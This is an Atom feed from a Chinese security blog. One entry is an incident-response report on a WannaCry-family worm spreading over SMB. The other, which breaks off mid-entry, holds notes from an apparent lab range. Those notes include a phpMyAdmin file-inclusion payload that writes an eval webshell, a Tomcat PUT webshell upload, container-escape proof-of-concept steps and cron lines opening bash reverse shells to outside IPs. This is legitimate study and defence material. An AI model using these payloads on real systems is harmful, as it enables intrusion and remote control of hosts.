<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://blog.m1n.me</id>
    <title>M1N&#39;s Blog</title>
    <link href="http://blog.m1n.me" />
    <updated>2022-01-04T08:16:05.000Z</updated>
    <entry>
        <id>http://blog.m1n.me/2022/01/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
        <title>记一次简单的蠕虫病毒事件应急响应</title>
        <link rel="alternate" href="http://blog.m1n.me/2022/01/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
        <content type="html">&lt;h2 id=&#34;背景描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#背景描述&#34;&gt;#&lt;/a&gt; 背景描述&lt;/h2&gt;
&lt;p&gt;某日接到某省政务外网安全监管平台通报，某单位的一个 IP 发生 Parite 蠕虫病毒活动事件，其对政务外网内其他地市主机发起 SMB 扫描攻击。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h2 id=&#34;事件分析处置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#事件分析处置&#34;&gt;#&lt;/a&gt; 事件分析处置&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;与客户沟通，被通报的 IP 为政务网的出口 IP，不属于某一台服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络环境中具有上网行为管理系统，通过排查筛选，定位到一共有四台主机向其他主机的 445 端口发送大量请求&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620353.png&#34; alt=&#34;image-20211116165756380&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;与客户沟通了解到对应的四台主机为个人 PC，不是服务器，远程登录到其中的一台主机上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上机发现客户对接人员很贴心的帮我们用杀毒软件进行了排查&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620817.png&#34; alt=&#34;image-20211116165949834&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到排查到的风险文件为 C:\Windows\svchost.exe，参考文章 https://xz.aliyun.com/t/8095#toc-4 可以知道，通常在攻击者使用创建服务来实现权限维持的时候，可以把恶意进程隐藏在 svchost 进程中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过工具检查端口使用情况，发现进程 ID 为 2824 的程序向外部主机 445 端口发起大量 TCP 请求&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620314.png&#34; alt=&#34;image-20211116170723354&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过任务管理器查找对于的进程，发现其服务名为 mssecsvc2.0&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620578.png&#34; alt=&#34;image-20211116171005724&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;定位到恶意文件为 C:\Windows\mssecsvc.exe 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620248.png&#34; alt=&#34;image-20211116171100384&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620281.png&#34; alt=&#34;image-20211116171221677&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过搜索引擎收集此恶意文件的相关信息，得到其相关描述：&lt;/p&gt;
&lt;p&gt;mssecsvc.exe 文件为通过利用永恒之蓝漏洞的勒索病毒，原病毒文件 mssecsvc.exe 会释放并执行 tasksche.exe 文件，然后检查 kill switch 域名。之后它会创建 mssecsvc2.0 服务。该服务会使用与初次执行不同的入口点执行 mssecsvc.exe 文件。第二次执行会检查被感染电脑的 IP 地址，并尝试联接到相同子网内每个 IP 地址的 TCP 445 端口。当恶意软件成功攻击并联接到一台电脑时，将会建立联接并传输数据，不断进行扩散攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过排查发现 C:\Windows 目录下的确存在 tasksche.exe 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620466.png&#34; alt=&#34;image-20211116172028785&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过排查如系统账号、启动项、计划任务、服务等攻击者常用于权限维持手段的敏感配置，发现 mssecsvc.exe 运行于 svchost.exe 进程下，这与步骤 4 中的杀毒软件排查相互印证，而运行于 svchost.exe 的行为常见于攻击者通过注册系统服务来实现自启动恶意文件的目的&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620529.png&#34; alt=&#34;image-20211116172256162&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查系统的自启动服务项，发现确实存在自启动 mssecsvc2.0 服务的服务项&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620000.png&#34; alt=&#34;image-20211116172406701&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;结合搜索引擎中关于 mssecsvc.exe 病毒的描述是通过永恒之蓝漏洞进行传播，利用 360NSA 武器库免疫工具对主机是否存在永恒之蓝漏洞进行排查，发现系统存在多个包括永恒之蓝在内的主机漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041620955.png&#34; alt=&#34;image-20211116172422895&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;排查主机端口开启状态，发现该主机的 445 端口对外开放&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621402.png&#34; alt=&#34;image-20211116172445687&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过对主机上的病毒样本进行采样，上传至分析系统进行检测，其主要的恶意行为如下：&lt;/p&gt;
&lt;p&gt;（1）通过创建服务实现自启动，这与步骤 7、8 所排查到的行为相互印证&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621665.png&#34; alt=&#34;image-20211116172532390&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;（2）&lt;a href=&#34;http://xn--www-633e.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com&#34;&gt;向 www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com&lt;/a&gt;、104.17.244.81 发送请求&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621059.png&#34; alt=&#34;image-20211116172614229&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621514.png&#34; alt=&#34;image-20211116172619205&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过威胁情报可以确定对应 IP、域名为常见勒索病毒对应的恶意域名&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621899.png&#34; alt=&#34;image-20211116172640677&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;C:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116172648753.png&#34; alt=&#34;image-20211116172648753&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;继续对剩余的三台主机进行排查，发现大致情况都一致&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;排查结论&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#排查结论&#34;&gt;#&lt;/a&gt; 排查结论&lt;/h2&gt;
&lt;p&gt;经过详细检测分析，判断该单位出口 IP 为 xxx.xxx.xxx.xxx 的内网网段中，有四台主机感染了 Wannacry 系列勒索病毒家族的蠕虫病毒。&lt;/p&gt;
&lt;p&gt;此病毒通过利用永恒之蓝漏洞进行感染传播，当某台主机存在永恒之蓝漏洞被攻击感染上病毒后，将变成新的攻击机，对内外网中的其他主机进行攻击达到扩散传播的目的。此行为被政务外网安全监管平台捕获，触发报警。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h2&gt;
&lt;p&gt;1、 通过安装系统补丁（补丁地址见第 7 点），或 360NSA 武器免疫工具（下载地址：&lt;a href=&#34;http://dl.360safe.com/nsa/nsatool.exe%EF%BC%89%E4%BF%AE%E5%A4%8D%E2%80%9C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E2%80%9D%E6%BC%8F%E6%B4%9E%E3%80%82&#34;&gt;http://dl.360safe.com/nsa/nsatool.exe）修复 “永恒之蓝” 漏洞。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、 添加入站规则，建议关闭除业务外不必要的端口 445、135、137、138、139 端口&lt;/p&gt;
&lt;p&gt;3、 断网并对系统全部磁盘进行病毒木马扫描，以清除蠕虫病毒，并观察一段时间，若又发现蠕虫病毒需保存备份重要文件并重装系统。&lt;/p&gt;
&lt;p&gt;4、 开启服务的日志记录功能，及时安装并更新相关补丁。&lt;/p&gt;
&lt;p&gt;5、 对主机系统安装杀毒软件。&lt;/p&gt;
&lt;p&gt;6、 定期查看系统安全日志，并且使用杀毒软件定期对系统进行体检。&lt;/p&gt;
&lt;p&gt;7、 下载补丁地址 &lt;a href=&#34;http://www.catalog.update.microsoft.com/search.aspx?q=%E8%A1%A5%E4%B8%81%E7%BC%96%E5%8F%B7&#34;&gt;http://www.catalog.update.microsoft.com/search.aspx?q = 补丁编号&lt;/a&gt; （根据自己的系统版本在下图中查找补丁编号）&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041621577.png&#34; alt=&#34;image-20211116172902197&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8095#toc-4&#34;&gt;https://xz.aliyun.com/t/8095#toc-4&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2022-01-04T08:16:05.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/</id>
        <title>红日靶场(四)笔记</title>
        <link rel="alternate" href="http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/"/>
        <content type="html">&lt;p&gt;红日靶场四学习记录&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;因为做的过程中，时间跨度比较大，前半段是打的公司的靶场，后半段自己搭建靶场，故 IP 有所变动。拓扑如下：&lt;br&gt;
&lt;a href=&#34;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&#34;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png&#34; alt=&#34;13&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ubuntu 用 Docker 跑了三个 Web 服务，一台 Win7 域成员机，一台 Winserver2008 域控&lt;/p&gt;
&lt;h2 id=&#34;外网打点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#外网打点&#34;&gt;#&lt;/a&gt; 外网打点&lt;/h2&gt;
&lt;h3 id=&#34;2001端口struct2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2001端口struct2&#34;&gt;#&lt;/a&gt; 2001 端口 Struct2&lt;/h3&gt;
&lt;p&gt;Burp 抓包看到 Struct2 字样，直接工具测试一把梭&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2002端口tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2002端口tomcat&#34;&gt;#&lt;/a&gt; 2002 端口 Tomcat&lt;/h3&gt;
&lt;p&gt;可以参考 https://www.freebuf.com/articles/web/271892.html&lt;/p&gt;
&lt;p&gt;使用 PUT 上传冰蝎马，注意直接上传 &lt;code&gt;/shell.jsp&lt;/code&gt;  不行哦&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2003端口phpmyadmin-481&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2003端口phpmyadmin-481&#34;&gt;#&lt;/a&gt; 2003 端口 phpMyAdmin 4.8.1&lt;/h3&gt;
&lt;p&gt;可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;验证漏洞是否存在&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 SELECT 语句后包含 session 文件来 get shell，写 shell &lt;code&gt;SELECT &amp;quot;&amp;lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&amp;lt;?=@eval($_POST[1]);&#39;);?&amp;gt;&amp;quot;  &lt;/code&gt; ，访问发现 &lt;code&gt;http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867&lt;/code&gt;  出现 phpinfo，用蚁剑连接 m1n.php 即可。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;docker逃逸2002端口的tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker逃逸2002端口的tomcat&#34;&gt;#&lt;/a&gt; Docker 逃逸（2002 端口的 Tomcat）&lt;/h2&gt;
&lt;h3 id=&#34;如何判断是否在docker里&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何判断是否在docker里&#34;&gt;#&lt;/a&gt; 如何判断是否在 Docker 里&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;检查  &lt;code&gt;/.dockerenv&lt;/code&gt;  文件是否存在&lt;/li&gt;
&lt;li&gt;检查  &lt;code&gt;/proc/1/cgroup&lt;/code&gt;  内是否包含 Docker 等字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;尝试dirtycow漏洞逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试dirtycow漏洞逃逸&#34;&gt;#&lt;/a&gt; 尝试 DirtyCow 漏洞逃逸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载 POC：&lt;a href=&#34;https://github.com/scumjr/dirtycow-vdso&#34;&gt;https://github.com/scumjr/dirtycow-vdso&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编译，上传，监听，运行，没反应，下一个。&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;git clone https:&lt;span class=&#34;hljs-regexp&#34;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&#34;hljs-regexp&#34;&gt;/scumjr/&lt;/span&gt;dirtycow-vdso.git&lt;br&gt;cd dirtycow-vdso&lt;br&gt;make&lt;br&gt;./&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef ip:port&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;尝试runc容器逃逸漏洞cve-2019-5736&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试runc容器逃逸漏洞cve-2019-5736&#34;&gt;#&lt;/a&gt; 尝试 runC 容器逃逸漏洞（CVE-2019-5736）&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;下载 POC：&lt;a href=&#34;https://github.com/Frichetten/CVE-2019-5736-PoC&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;改 POC，把 payload 那行改成自己 VPS 的 IP&lt;/li&gt;
&lt;li&gt;编译（建议 Linux 环境下） &lt;code&gt;CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;上传文件，监听端口，执行，没反应，下一个。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;尝试特权模式逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试特权模式逃逸&#34;&gt;#&lt;/a&gt; 尝试特权模式逃逸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;fdisk -l&lt;/code&gt;  查看磁盘&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mkdir&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mount&lt;/span&gt; /dev/sda&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到宿主机的文件都到了 /m1n 目录下&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png&#34; alt=&#34;image-20210816152534150&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;尝试写定时任务来反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试写定时任务来反弹shell&#34;&gt;#&lt;/a&gt; 尝试写定时任务来反弹 shell&lt;/h4&gt;
&lt;p&gt;参考：&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;写文件到 &lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt; ，注意写到 &lt;code&gt;/var/spool/cron/root&lt;/code&gt;  不行嗷&lt;/li&gt;
&lt;li&gt;同时注意 root 文件的权限必须为 600&lt;/li&gt;
&lt;li&gt;注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 &lt;code&gt;.sh&lt;/code&gt;  文件，然后 &lt;code&gt;chmod +x&lt;/code&gt; ，然后调用，不容易出错&lt;/li&gt;
&lt;li&gt;也可以 &lt;code&gt;*/1 * * * *  bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/123.207.x.x/1234 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;定时任务相关笔记：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;定时任务有时无法看到报错信息，可以这样获取报错信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\* * * * * &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.106/7777 0&amp;gt;&amp;amp;1&#39;&amp;gt;/tmp/error.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;定时任务查看日志：&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（1）查看系统日志直接： &lt;code&gt;tail -f /var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（2）查看 crontab 日志：&lt;/p&gt;
&lt;p&gt;​	方法 1&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. 修改rsyslog文件，将&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;rsyslog.d/&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;-default.conf 文件中的&lt;span class=&#34;hljs-comment&#34;&gt;#cron.*前的#删掉；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. 重启rsyslog服务service rsyslog restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. 重启cron服务service cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	方法 2&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. 编辑 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;syslog.conf，并且打开以cron.*开始的那行注释。&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. 运行 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/sysklogd restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. 运行 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	查看 cron 日志&lt;/p&gt;
